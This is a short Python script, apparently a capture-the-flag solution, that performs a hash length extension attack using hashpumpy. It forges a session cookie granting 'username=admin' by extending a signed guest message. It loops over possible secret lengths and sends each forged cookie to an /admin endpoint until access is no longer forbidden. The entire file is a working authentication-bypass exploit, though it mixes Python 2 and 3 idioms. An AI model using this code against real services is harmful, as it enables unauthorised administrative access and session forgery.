import base64
import os 
import hashpumpy 
import requests
import binascii
sig = base64.b64decode("q/tHSgFZA94NONf7FQmSl1Xk4zJO4VQ1kT5VKgSbxqY=")
orig_msg = base64.b64decode("dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7")
known = ';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'
target = "hello"
for i in range(0,80):
    newdgst, newmsg = hashpumpy.hashpump(sig.encode('hex'),orig_msg,known,i)
    """print('-------')
    print(newmsg)
    print('-------')
    print('-------')
    print(newdgst)
    print('-------')"""
    part1 = base64.b64encode(binascii.unhexlify(newdgst)).decode('utf-8')
    part2 = base64.b64encode(newmsg).decode('utf-8')
    cookie = part2 + b'.' + part1
    #base64.b64encode(known)
    #cookie = part1 + "." + part2
    req = requests.get(target + "/admin", cookies = { "auth" : cookie })
    #print(cookie)
    print(req)
    if "Forbidden" not in req.text:
        print("found")
        print(cookie)
